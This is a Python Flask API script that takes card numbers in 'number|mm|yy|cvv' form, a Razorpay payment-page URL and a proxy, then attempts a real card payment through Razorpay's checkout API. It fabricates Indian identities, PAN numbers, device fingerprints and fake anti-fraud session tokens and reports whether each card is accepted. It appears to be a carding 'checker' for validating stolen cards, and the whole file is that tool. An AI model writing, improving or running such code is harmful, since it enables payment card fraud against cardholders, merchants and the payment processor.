from flask import Flask, request, jsonify
import requests, random, string, hashlib, secrets, base64, json, re, time
from urllib.parse import urlparse, quote
requests.packages.urllib3.disable_warnings()

app = Flask(__name__)
app.json.sort_keys = False

base = "QFhvYXJjaA=="

def show_base(dev):
    try:
        return base64.b64decode(dev).decode()
    except Exception:
        return dev

BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
first_names = ["Aarav","Vivaan","Aditya","Vihaan","Arjun","Sai","Ishaan","Rohan","Karan","Rahul","Ravi","Amit","Vikram","Anil","Sunil","Rajesh","Sanjay","Deepak","Manoj","Suresh"]
last_names = ["Sharma","Patel","Singh","Verma","Gupta","Reddy","Kumar","Joshi","Mehta","Nair","Shah","Das","Bose","Chopra","Malhotra","Saxena","Rao","Desai","Pillai","Menon"]
streets = ["MG Road","Park Street","Church Street","Linking Road","Banjara Hills","Civil Lines","Marine Drive","Connaught Place","Sector 62","Bannerghatta Road","Lavelle Road","Sadar Bazaar"]
cities = ["Mumbai","Delhi","Bangalore","Hyderabad","Chennai","Kolkata","Pune","Ahmedabad","Jaipur","Lucknow","Surat","Indore"]
pincodes = ["400001","110001","560001","500001","600001","700001","380001","302001","226001","452001","160001","800001"]

def rand_phone():
    return "+91" + str(random.choice([6,7,8,9])) + ''.join(str(random.randint(0,9)) for _ in range(9))
def rand_name():
    return random.choice(first_names) + " " + random.choice(last_names)
def rand_email(n):
    return n.lower().replace(" ",".") + str(random.randint(1,99)) + "@gmail.com"
def rand_address():
    i = random.randint(0,len(cities)-1)
    return f"{random.randint(1,999)} {random.choice(streets)}, {cities[i]}- {pincodes[i]}"
def rand_pan():
    return ''.join(random.choices(string.ascii_uppercase,k=5)) + ''.join(random.choices(string.digits,k=4)) + random.choice(string.ascii_uppercase)

def parse_proxy(p):
    if not p: return None
    p = p.strip()
    scheme = "http"
    if '://' in p:
        s = p.split('://')
        if s[0].lower() in ("http", "https", "socks4", "socks5"):
            scheme = s[0].lower()
            p = s[1]
    body = p
    if '@' in body:
        auth, host = body.rsplit('@', 1)
        user, _, pwd = auth.partition(':')
        body = f"{user}:{pwd}@{host}"
    elif body.count(':') == 3:
        ip, port, user, pwd = body.split(':')
        body = f"{user}:{pwd}@{ip}:{port}"
    url = f"{scheme}://{body}"
    return {"http": url, "https": url}

def check_site(site_url, proxy=None, cc=None):
    parts = cc.split("|")
    cc_num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]

    name = rand_name()
    phone = rand_phone()
    email = rand_email(name)
    address = rand_address()
    pan = rand_pan()
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10**8)).zfill(8)
    rzp_device_id = f"1.{h}.{ts}.{rnd}"
    rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
    page_origin = urlparse(site_url).scheme + "://" + (urlparse(site_url).hostname or "pages.razorpay.com")

    session = requests.Session()
    if proxy: session.proxies.update(proxy)

    try:
        js = session.get("https://checkout.razorpay.com/v1/checkout.js", verify=False, timeout=15).text
        BUILD = (m.group(1) if (m := re.search(r'g="([a-f0-9]{40})"', js)) else "afa3662e035e66c495f2ddc21c6f030530870f53")
        BUILD_V1 = (m.group(1) if (m := re.search(r'build_v1:"([a-f0-9]{40})"', js)) else "da4ee3f43a28ad81dba8ed06daf899a4520c691f")
    except:
        BUILD = "afa3662e035e66c495f2ddc21c6f030530870f53"
        BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"

    r = session.get(site_url, verify=False, timeout=30, headers={"Accept": "text/html,*/*", "User-Agent": ua})
    m = re.search(r'var data = ({.*?});', r.text, re.DOTALL)
    if not m: return "page data not found"
    init_data = json.loads(m.group(1))
    if "error_code" in init_data: return str(init_data.get("message","page error"))[:200]
    kyid = init_data["key_id"]
    plink = init_data["payment_link"]["id"]
    ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
    klh = init_data.get("keyless_header", "")
    klh_url = quote(klh.encode('utf-8'), safe='')
    try:
        item_amt = init_data["payment_link"]["payment_page_items"][0].get("item",{}).get("amount")
        amo = int(item_amt) if item_amt else int(init_data["payment_link"].get("min_amount_value",100))
    except:
        amo = 100
    if amo < 1: amo = 100

    session.cookies.set("_rzp_unified_session_id", rzp_unified_session_id, domain=".razorpay.com")

    h_order = {
        "Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
        "Origin": page_origin, "Referer": page_origin+"/", "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }
    resp_o = session.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order", headers=h_order,
        json={"notes":{"comment":"", "name":name}, "line_items":[{"payment_page_item_id":ppid,"amount":amo}]},
        verify=False, timeout=30)
    try:
        od = json.loads(resp_o.text)
        if "error" in od: return str(od["error"].get("description","order failed"))[:200]
        order_id = od["order"]["id"]
        checkout_id = order_id.split("_")[1]
    except:
        return f"HTTP {resp_o.status_code}"

    h_pub = {
        "Accept": "text/html,*/*", "Referer": page_origin+"/", "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }
    params_pub = {
        "traffic_env": "canary", "build": BUILD, "build_v1": BUILD_V1,
        "checkout_v2": "1", "new_session": "1", "keyless_header": klh,
        "rzp_device_id": rzp_device_id, "unified_session_id": rzp_unified_session_id,
    }
    r_pub = session.get("https://api.razorpay.com/v1/checkout/public", params=params_pub, headers=h_pub, verify=False, timeout=30)
    sessid = (m.group(1) if (m := re.search(r'window.session_token="([^"]+)"', r_pub.text)) else "")
    if not sessid:
        m = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', r_pub.text)
        if m: sessid = m.group(1)
    if not sessid: return "session_token not found"

    h_pref = {
        "Accept": "*/*", "Content-type": "application/json", "Origin": "https://api.razorpay.com",
        "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
        "User-Agent": ua, "x-session-token": sessid,
    }
    session.post("https://api.razorpay.com/v2/standard_checkout/preferences",
        params={"x_entity_id":order_id,"session_token":sessid,"keyless_header":klh},
        headers=h_pref, data=json.dumps({"identifiers":{},"action":"get"}), verify=False, timeout=30)

    h_co = {
        "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded", "Origin": "https://api.razorpay.com",
        "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
        "User-Agent": ua, "x-session-token": sessid,
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }
    params_co = {"key_id":kyid,"session_token":sessid,"keyless_header":klh}
    data_co = {
        "notes[email]":email,"notes[phone]":phone[3:],"payment_link_id":plink,
        "key_id":kyid,"contact":phone,"email":email,"currency":"INR",
        "_[integration]":"payment_pages","_[device.id]":rzp_device_id,
        "_[library]":"checkoutjs","_[library_src]":"no-src","_[current_script_src]":"no-src",
        "_[platform]":"browser","_[env]":"","_[is_magic_script]":"false","_[os]":"windows",
        "_[shield][fhash]":h,"_[shield][tz]":"330","_[device_id]":rzp_device_id,
        "_[build]":BUILD,"_[shield][os]":"windows","_[shield][platform]":"browser",
        "_[shield][browser]":"chrome","_[request_index]":"0","amount":amo,
        "order_id":order_id,"method":"card","checkout_id":checkout_id,
    }
    r_co = session.post("https://api.razorpay.com/v1/standard_checkout/checkout/order", params=params_co, headers=h_co, data=data_co, verify=False, timeout=30)
    try: coid_local = json.loads(r_co.text).get("checkout_id", checkout_id)
    except: coid_local = checkout_id

    h_cb = {
        "Accept": "*/*", "Content-type": "application/json", "User-Agent": ua, "x-session-token": sessid,
        "Origin": "https://api.razorpay.com",
        "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
    }
    payload_cb = {
        "identifiers": {"merchant":{"country":"IN"},"card":{"country":"US","dcc_blacklist":False,"network":"visa"},"method":"card","payment_currency":"INR"},
        "forex_charges": {"amount":amo,"currency":"INR","filters":{"method":"card"}}
    }
    session.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={klh_url}", headers=h_cb, json=payload_cb, verify=False, timeout=30)

    token_create = base64.b64encode(json.dumps([
        {"name":"sardine","metadata":{"session_id":coid_local}},
        {"name":"stripe_radar","metadata":{"session_id":"rse_"+''.join(secrets.choice(string.ascii_letters+string.digits) for _ in range(22))}}
    ], separators=(',',':')).encode()).decode()

    h_create = {
        "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded", "Origin": "https://api.razorpay.com",
        "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
        "User-Agent": ua, "x-session-token": sessid,
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }
    params_create = {"x_entity_id":order_id,"session_token":sessid,"keyless_header":klh}
    data_create = {
        "user_risk_providers_token": token_create,
        "notes[comment]":"","notes[email]":email,"notes[phone]":phone[3:],
        "notes[full_name_of_the_donor]":name,"notes[full_address_of_the_donor]":address,"notes[pan_number]":pan,
        "payment_link_id":plink,"key_id":kyid,"contact":phone,"email":email,"currency":"INR",
        "_[integration]":"payment_pages","_[checkout_id]":coid_local,"_[device.id]":rzp_device_id,
        "_[library]":"checkoutjs","_[library_src]":"no-src","_[current_script_src]":"no-src",
        "_[platform]":"browser","_[env]":"","_[is_magic_script]":"false","_[os]":"windows",
        "_[referer]":site_url,"_[shield][fhash]":h,"_[shield][tz]":"330",
        "_[device_id]":rzp_device_id,"_[build]":BUILD,"_[request_index]":"1",
        "amount":amo,"order_id":order_id,"method":"card",
        "card[number]":cc_num,"card[cvv]":cvv,"card[name]":name,"card[expiry_month]":mm,"card[expiry_year]":yy,
        "save":"0",
    }

    r_final = session.post("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax", params=params_create, headers=h_create, data=data_create, verify=False, timeout=30)
    txt = r_final.text

    try:
        j = json.loads(txt)
        if isinstance(j, dict) and "error" in j:
            desc = str(j["error"].get("description", txt))[:200]
            return desc.split(".")[0] + "."
        if isinstance(j, dict) and "payment_id" in j:
            return f"payment_id: {j['payment_id']} | redirect: {str(j.get('redirect')).lower()}"
    except Exception:
        pass
    return txt[:200]

@app.route("/razorpay", methods=["GET"])
def razorpay():
    site = request.args.get("site", "").strip()
    cc = request.args.get("cc", "").strip()
    proxy_str = request.args.get("proxy", "").strip()

    if not site:
        return jsonify({"CC": cc, "Response": "Site is required", "Site": site, "Time": "0s", "Dev": base}), 400
    if not cc:
        return jsonify({"CC": cc, "Response": "CC is required", "Site": site, "Time": "0s", "Dev": base}), 400
    if not proxy_str:
        return jsonify({"CC": cc, "Response": "Proxy is required", "Site": site, "Time": "0s", "Dev": base}), 400

    proxy = parse_proxy(proxy_str)
    if not proxy:
        return jsonify({"CC": cc, "Response": "Invalid proxy format", "Site": site, "Time": "0s", "Dev": base}), 400

    start = time.time()
    try:
        msg = check_site(site, proxy, cc)
    except Exception as e:
        msg = str(e)
    elapsed = f"{round(time.time() - start, 2)}s"

    return jsonify({
        "CC": cc,
        "Response": msg[:200],
        "Site": site,
        "Time": elapsed,
        "Dev": show_base(base),
    })

if __name__ == "__main__":
    import logging, sys
    try: sys.stdout.reconfigure(encoding="utf-8")
    except Exception: pass
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    print("𝗔𝗣𝗜 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...", flush=True)
    from werkzeug.serving import run_simple
    run_simple("0.0.0.0", 8080, app, threaded=True)